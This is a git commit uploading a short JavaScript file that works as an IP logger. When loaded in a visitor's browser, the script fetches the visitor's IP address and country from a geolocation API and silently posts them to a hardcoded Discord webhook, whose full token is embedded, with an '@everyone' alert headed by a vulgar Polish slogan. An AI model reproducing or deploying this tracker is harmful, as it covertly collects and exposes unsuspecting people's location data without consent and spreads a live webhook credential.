adde961e316504abb21a58801c4df060841e8ba1
KeBeS1337 <96841528+Sebastianek69@users.noreply.github.com>
2022-08-30 11:02:03 +0200

    Add files via upload

---
+++ javascript.js
@@ -0,0 +1,36 @@
+var webHookUrl = "https://discord.com/api/webhooks/1014082078586961940/KD3MxskiIf2Pn9haVFszoxSUl6M0ghSvc4Fdc-SiWlyCoB03w7RW0xQzxGJXcn5L4SeN";
+
+$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
+  console.log(JSON.stringify(data, null, 2));
+});
+
+const request = async () => { // Calling a "synchronous" fetch
+    const response = await fetch('https://api.db-ip.com/v2/free/self');
+    const data = await response.json();
+    console.log(data);
+
+    // Declaring variables
+    var ip = data.ipAddress;
+    var country = data.countryName;
+
+    // Open POST Request
+    var postRequest = new XMLHttpRequest();
+    postRequest.open("POST", webHookUrl);
+
+    postRequest.setRequestHeader('Content-type', 'application/json');
+
+    var params = {
+        username:   "IP Log",
+        avatar_url: "",
+        content:    "**NOWA KURWA IP BOMBA** @everyone \n" + 
+		    "__**:globe_with_meridians: IP Address:**__ \n" +
+                    "`" + ip + "` \n \n" +
+		    "__**Country:**__ \n" +
+		    "`" + country + "`"
+    }
+
+    postRequest.send(JSON.stringify(params));
+
+}
+
+request();
